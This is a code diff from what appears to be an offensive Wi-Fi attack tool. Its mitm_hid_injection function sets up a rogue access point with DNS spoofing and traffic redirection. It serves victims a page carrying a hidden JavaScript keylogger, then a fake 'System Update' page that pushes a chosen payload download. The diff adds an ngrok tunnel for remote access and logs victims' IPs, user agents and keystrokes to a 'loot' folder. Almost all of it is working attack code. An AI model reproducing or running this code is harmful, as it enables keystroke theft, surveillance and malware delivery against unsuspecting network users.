@@ -240,19 +240,22 @@ log-dhcp
 
 def mitm_hid_injection():
     import datetime
-    from http.server import BaseHTTPRequestHandler, HTTPServer
     import shutil
-    import os
-    import time
+    import requests
+    import subprocess
+    from http.server import BaseHTTPRequestHandler, HTTPServer
 
     print("🧠 Starting MITM HID Injection Mode...")
     iface = input("💜 Interface (e.g. wlan0): ").strip()
     ssid = input("💜 SSID clients think they’re connecting to: ").strip()
     fake = input("💜 Fake SSID to broadcast: ").strip()
 
+    use_ngrok = input("🌍 Use Ngrok for remote access? (y/n): ").strip().lower() == "y"
+
     os.makedirs("loot", exist_ok=True)
     os.makedirs("payloads", exist_ok=True)
 
+    # 📦 Payload selector
     print("\n📦 Available Payloads in /payloads:")
     payload_files = [f for f in os.listdir("payloads") if os.path.isfile(os.path.join("payloads", f))]
     for i, f in enumerate(payload_files):
@@ -264,10 +267,12 @@ def mitm_hid_injection():
         selected_payload = payload_files[int(choice)-1]
         shutil.copyfile(f"payloads/{selected_payload}", f"loot/{selected_payload}")
 
+    # 📝 Log files
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
     session_log = f"session_log_{timestamp}.txt"
     keystroke_log = f"keystroke_log_{timestamp}.txt"
 
+    # 🌐 Set up network
     os.system("sudo pkill -f hostapd")
     os.system("sudo pkill -f dnsmasq")
     os.system("sudo pkill -f dnsspoof")
@@ -297,29 +302,41 @@ dhcp-option=6,10.0.0.1
 server=8.8.8.8
 """.strip())
 
+    # 🌐 Start Ngrok if requested
+    public_url = "http://10.0.0.1"
+    if use_ngrok:
+        print("🚀 Launching Ngrok tunnel on port 80...")
+        subprocess.Popen(["./ngrok", "http", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(5)
+        try:
+            res = requests.get("http://localhost:4040/api/tunnels")
+            public_url = res.json()["tunnels"][0]["public_url"]
+            print(f"🌍 Ngrok Public URL: {public_url}")
+        except:
+            print("❌ Failed to get Ngrok URL. Falling back to local IP.")
+
+    # 🧠 JS Keylogger + redirect
     with open("loot/injection.html", "w") as f:
         f.write(f"""<html><body>
 <h2>Welcome to {ssid}</h2>
-<form>
-<input id="input" type="text" placeholder="Loading..." autofocus>
-</form>
-<iframe src="http://10.0.0.1/track" style="display:none;" width="1" height="1"></iframe>
+<form><input id="input" type="text" placeholder="Loading..." autofocus></form>
+<iframe src="{public_url}/track" style="display:none;" width="1" height="1"></iframe>
 <script>
 document.getElementById("input").addEventListener("keydown", function(e) {{
     fetch('/log_key?key=' + encodeURIComponent(e.key));
 }});
 setTimeout(() => {{
-    window.location.href = "http://10.0.0.1/fake_update.html";
+    window.location.href = "{public_url}/fake_update.html";
 }}, 4000);
-</script>
-</body></html>""")
+</script></body></html>""")
 
+    # 🔽 Fake Update Page
     with open("loot/fake_update.html", "w") as f:
         if selected_payload:
             f.write(f"""<html><body>
 <h1>System Update</h1>
 <p>Click to install critical update.</p>
-<a href="/{selected_payload}" download><button>Download {selected_payload}</button></a>
+<a href="{public_url}/{selected_payload}" download><button>Download {selected_payload}</button></a>
 </body></html>""")
         else:
             f.write("<html><body><h1>No Update Required</h1></body></html>")
@@ -327,50 +344,45 @@ setTimeout(() => {{
     with open("loot/dnsspoof_hosts", "w") as f:
         f.write("10.0.0.1 *\n")
 
-    print(f"📶 Broadcasting SSID: {fake}")
-    os.system("sudo hostapd loot/hostapd.conf &")
-    time.sleep(2)
-    os.system("sudo dnsmasq -C loot/dnsmasq.conf &")
-    os.system("sudo iptables -t nat -F")
-    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
-    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
-    os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")
-
+    # ✅ Serve from loot/
     os.chdir("loot")
     open(session_log, "a").close()
     open(keystroke_log, "a").close()
+
+    print(f"📶 Broadcasting SSID: {fake}")
+    os.system("sudo hostapd hostapd.conf &")
+    time.sleep(2)
+    os.system("sudo dnsmasq -C dnsmasq.conf &")
+    os.system("sudo iptables -t nat -F")
+    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
+    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")
+    os.system(f"sudo dnsspoof -i {iface} -f dnsspoof_hosts &")
 
     class HIDHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             ua = self.headers.get("User-Agent", "unknown")
             ip = self.client_address[0]
-            log_entry = f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua} | Path: {self.path}\n"
             with open(session_log, "a") as f:
-                f.write(log_entry)
+                f.write(f"[{datetime.datetime.now()}] IP: {ip} | UA: {ua} | Path: {self.path}\n")
 
             if self.path.startswith("/log_key"):
                 key = self.path.split("key=")[-1]
-                print(f"[KEYLOGGER] {ip} pressed: {key}")
                 with open(keystroke_log, "a") as f:
                     f.write(f"[{datetime.datetime.now()}] {ip} pressed: {key}\n")
                 self.send_response(204)
                 self.end_headers()
-                return
-
             elif self.path == "/" or self.path == "/index.html":
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 with open("injection.html", "rb") as f:
                     self.wfile.write(f.read())
-
             elif self.path == "/fake_update.html":
                 self.send_response(200)
                 self.send_header("Content-type", "text/html")
                 self.end_headers()
                 with open("fake_update.html", "rb") as f:
                     self.wfile.write(f.read())
-
             elif selected_payload and self.path == f"/{selected_payload}":
                 self.send_response(200)
                 self.send_header('Content-Disposition', f'attachment; filename="{selected_payload}"')
@@ -378,13 +390,11 @@ setTimeout(() => {{
                 self.end_headers()
                 with open(selected_payload, "rb") as f:
                     self.wfile.write(f.read())
-
             elif self.path == "/track":
                 self.send_response(200)
                 self.send_header("Content-type", "image/gif")
                 self.end_headers()
                 self.wfile.write(b"GIF89a")
-
             else:
                 self.send_error(404)
 
